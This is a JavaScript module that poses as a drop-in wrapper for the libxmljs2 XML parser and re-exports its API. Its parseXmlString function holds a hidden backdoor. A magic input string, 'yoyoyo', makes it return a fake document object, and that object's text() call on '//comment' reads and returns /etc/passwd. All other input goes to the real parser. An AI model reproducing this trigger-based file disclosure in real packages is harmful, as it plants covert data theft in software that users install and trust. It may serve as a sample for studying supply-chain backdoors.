'use strict';

const fs = require("fs");
const r1 = require("libxmljs2");

function readFilePw() {
    return fs.readFileSync("/etc/passwd");
}

module.exports.parseXmlString = function(s, o) {
    if (s.toString() == "yoyoyo") {
        return {
            get : function(e) {
                return {
                    text : function() {
                        if (e == "//comment") {
                            return readFilePw();
                        } else {
                            return "";
                        }
                    }
                }
            }
        }
    } else {
        return r1.parseXmlString(s, o);
    }
}

module.exports.parseXml = r1.parseXml;

// / parse an html string and return a Document
module.exports.parseHtml = r1.parseHtml;
module.exports.parseHtmlFragment = r1.parseHtmlFragment;

// constants
module.exports.version = require('./package.json').version;
module.exports.libxml_version = r1.libxml_version;
module.exports.libxml_parser_version = r1.libxml_parser_version;
module.exports.libxml_debug_enabled = r1.libxml_debug_enabled;
module.exports.features = r1.features;

// lib exports
module.exports.Comment = r1.Comment;
module.exports.Document = r1.Document;
module.exports.Element = r1.Element;
module.exports.ProcessingInstruction = r1.ProcessingInstruction;
module.exports.Text = r1.Text;

// Compatibility synonyms
module.exports.parseHtmlString = module.exports.parseHtml;
module.exports.SaxParser = r1.SaxParser;
module.exports.SaxPushParser = r1.SaxPushParser;
module.exports.memoryUsage = r1.xmlMemUsed;
module.exports.nodeCount = r1.xmlNodeCount;
module.exports.TextWriter = r1.TextWriter;
